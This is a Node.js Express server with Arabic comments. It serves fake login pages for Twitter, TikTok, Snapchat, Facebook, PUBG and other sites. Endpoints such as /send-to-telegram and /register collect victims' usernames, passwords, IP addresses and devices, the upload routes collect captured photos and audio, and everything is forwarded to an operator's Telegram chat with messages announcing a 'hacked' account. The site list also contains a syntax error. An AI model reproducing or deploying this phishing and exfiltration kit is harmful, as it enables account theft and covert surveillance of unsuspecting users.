require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// تكوين multer للتعامل مع رفع الملفات
// على ريندر، نستخدم الذاكرة المؤقتة بدلاً من نظام الملفات
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// الحصول على التوكن من متغير البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;

// التحقق من وجود التوكن
if (!BOT_TOKEN) {
  console.error('❌ Telegram Bot Token is not configured');
  // لا نوقف العملية على ريندر بل نعطي تحذير فقط
  console.warn('⚠️  سيتم تشغيل السيرفر ولكن إرسال الرسائل إلى Telegram لن يعمل');
}

// قائمة المواقع المتاحة
const availableSites = [
  'twitter.html',
  'Bobji.html',
  'tik.html',
  'snap.html',
  'face.html',
  'yot.html''
  'des.html'
  // يمكنك إضافة المزيد من المواقع هنا
];

// Middleware للتعامل مع معرفات Telegram
app.use((req, res, next) => {
  // استخراج المسار وفحص إذا كان يحتوي على معرف Telegram
  const pathParts = req.path.split('/').filter(part => part !== '');
  
  if (pathParts.length >= 2) {
    const siteName = pathParts[0];
    const telegramId = pathParts[1];
    
    // التحقق من أن الموقع موجود
    const siteFile = `${siteName}.html`;
    if (availableSites.includes(siteFile)) {
      // إذا كان هناك معرف Telegram، نقوم بتوجيه الطلب إلى الموقع المناسب
      req.siteName = siteName;
      req.telegramId = telegramId;
      req.url = `/${siteFile}`;
    }
  }
  
  next();
});

// وظيفة لإرسال رسالة إلى Telegram
async function sendToTelegram(chatId, message, fileBuffer = null, filename = null) {
  try {
    // إذا لم يكن هناك توكن، نعود بنجاح وهمي للتجربة
    if (!BOT_TOKEN) {
      console.log(`📤 [محاكاة] إرسال إلى chatId ${chatId}: ${message}`);
      if (fileBuffer) {
        console.log(`📁 [محاكاة] مع ملف: ${filename}`);
      }
      return true;
    }

    if (fileBuffer && filename) {
      // إذا كان هناك ملف، أرسله مع الرسالة
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('caption', message);
      formData.append('document', fileBuffer, { filename: filename });
      
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
        headers: formData.getHeaders()
      });
      
      return response.data.ok;
    } else {
      // إذا لم يكن هناك ملف، أرسل الرسالة فقط
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
      
      return response.data.ok;
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// نقطة النهاية لاستقبال بيانات التسجيل
app.post('/send-to-telegram', async (req, res) => {
  try {
    const { playerId, password, amount, chatId, platform = "انستقرام", device } = req.body;
    
    // التحقق من البيانات المطلوبة
    if (!playerId || !password || !amount || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة: يرجى التأكد من إرسال جميع البيانات المطلوبة'
      });
    }

    const userDevice = device || req.headers['user-agent'] || "غير معروف";
    
    // الحصول على عنوان IP المستخدم
    let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
    if (userIP === '::1') userIP = '127.0.0.1 (localhost)';
    
    const message = `♦️ - تم اختراق حساب جديد 

🔹 - اسم المستخدم: ${playerId}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount}
📱 - الجهاز: ${userDevice}
🌍 - IP: ${userIP}
🔄 - المنصة: ${platform}`;

    // إرسال الرسالة إلى Telegram
    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.json({
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح',
        orderId: `#${Math.floor(100000 + Math.random() * 900000)}`
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'فشل في إرسال الرسالة إلى Telegram'
      });
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء إرسال البيانات',
      error: error.message
    });
  }
});

// نقطة النهاية لاستقبال بيانات التسجيل العامة
app.post('/register', async (req, res) => {
  try {
    const { username, password, ip, chatId } = req.body;
    
    if (!username || !password || !ip || !chatId) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required fields: username, password, ip, and chatId are required' 
      });
    }

    const message = `📝 تسجيل حساب جديد\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🌐 عنوان IP: ${ip}`;
    
    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال البيانات إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing registration:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// نقطة النهاية لاستقبال الصور
app.post('/upload-image', upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'No image file provided' 
      });
    }

    const { username, imageType, chatId } = req.body;
    
    let message = `🖼️ تم اختراق صورة جديدة`;
    if (username) message += `\n👤 المستخدم: ${username}`;
    if (imageType) message += `\n📸 نوع الصورة: ${imageType}`;
    
    const success = await sendToTelegram(
      chatId, 
      message, 
      req.file.buffer, 
      `image-${Date.now()}${path.extname(req.file.originalname || '.jpg')}`
    );
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال الصورة إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال الصورة إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing image upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// نقطة النهاية لاستقبال ملفات الصوت
app.post('/upload-audio', upload.single('audio'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'No audio file provided' 
      });
    }

    const { username, chatId } = req.body;
    
    let message = `🎵 تم تسجيل صوت جديد`;
    if (username) message += `\n👤 المستخدم: ${username}`;
    
    const success = await sendToTelegram(
      chatId, 
      message, 
      req.file.buffer, 
      `audio-${Date.now()}${path.extname(req.file.originalname || '.mp3')}`
    );
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال الصوت إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال الصوت إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing audio upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// Route للصفحة الرئيسية
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>خادم المواقع المتعددة</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                direction: rtl;
                text-align: center;
                padding: 50px;
                background-color: #f5f5f5;
            }
            h1 {
                color: #333;
            }
            .site-list {
                list-style: none;
                padding: 0;
                max-width: 500px;
                margin: 30px auto;
            }
            .site-list li {
                background: white;
                margin: 10px 0;
                padding: 15px;
                border-radius: 5px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            }
            .site-list a {
                text-decoration: none;
                color: #007bff;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <h1>خادم المواقع المتعددة</h1>
        <p>المواقع المتاحة:</p>
        <ul class="site-list">
            ${availableSites.map(site => {
              const siteName = site.replace('.html', '');
              return `<li><a href="/${siteName}">${siteName}</a></li>`;
            }).join('')}
        </ul>
        <p>يمكنك الوصول إلى أي موقع باستخدام معرف Telegram مثل: <code>https://cameraijn.onrender.com/Bobji/08874555</code></p>
    </body>
    </html>
  `);
});

// Route للتعامل مع المواقع بدون معرف Telegram
app.get('/:siteName', (req, res) => {
  const siteName = req.params.siteName;
  const siteFile = `${siteName}.html`;
  
  if (availableSites.includes(siteFile)) {
    res.sendFile(path.join(__dirname, 'public', siteFile));
  } else {
    res.status(404).send(`
      <!DOCTYPE html>
      <html lang="ar">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>404 - الصفحة غير موجودة</title>
          <style>
              body {
                  font-family: Arial, sans-serif;
                  direction: rtl;
                  text-align: center;
                  padding: 50px;
                  background-color: #f5f5f5;
              }
              h1 {
                  color: #d9534f;
              }
              a {
                  color: #007bff;
                  text-decoration: none;
              }
          </style>
      </head>
      <body>
          <h1>404 - الصفحة غير موجودة</h1>
          <p>الموقع المطلوب غير موجود.</p>
          <p><a href="/">العودة إلى الصفحة الرئيسية</a></p>
      </body>
      </html>
    `);
  }
});

// Route للتعامل مع المواقع مع معرف Telegram
app.get('/:siteName/:telegramId', (req, res) => {
  const siteName = req.params.siteName;
  const telegramId = req.params.telegramId;
  const siteFile = `${siteName}.html`;
  
  if (availableSites.includes(siteFile)) {
    // هنا يمكنك إضافة أي معالجة إضافية متعلقة بمعرف Telegram
    console.log(`طلب موقع ${siteName} مع معرف Telegram: ${telegramId}`);
    
    // تقديم الموقع المطلوب
    res.sendFile(path.join(__dirname, 'public', siteFile));
  } else {
    res.status(404).send(`
      <!DOCTYPE html>
      <html lang="ar">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>404 - الصفحة غير موجودة</title>
          <style>
              body {
                  font-family: Arial, sans-serif;
                  direction: rtl;
                  text-align: center;
                  padding: 50px;
                  background-color: #f5f5f5;
              }
              h1 {
                  color: #d9534f;
              }
              a {
                  color: #007bff;
                  text-decoration: none;
              }
          </style>
      </head>
      <body>
          <h1>404 - الصفحة غير موجودة</h1>
          <p>الموقع المطلوب غير موجود.</p>
          <p><a href="/">العودة إلى الصفحة الرئيسية</a></p>
      </body>
      </html>
    `);
  }
});

// نقطة النهاية للتحقق من عمل السيرفر
app.get('/health', (req, res) => {
  res.status(200).json({ 
    success: true,
    status: 'Server is running',
    tokenConfigured: !!BOT_TOKEN,
    environment: process.env.NODE_ENV || 'development'
  });
});

// بدء السيرفر
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
  if (!BOT_TOKEN) {
    console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
  }
  console.log('المواقع المتاحة:');
  availableSites.forEach(site => {
    const siteName = site.replace('.html', '');
    console.log(`- http://localhost:${PORT}/${siteName}`);
    console.log(`- http://localhost:${PORT}/${siteName}/08874555 (مع معرف Telegram كمثال)`);
  });
});
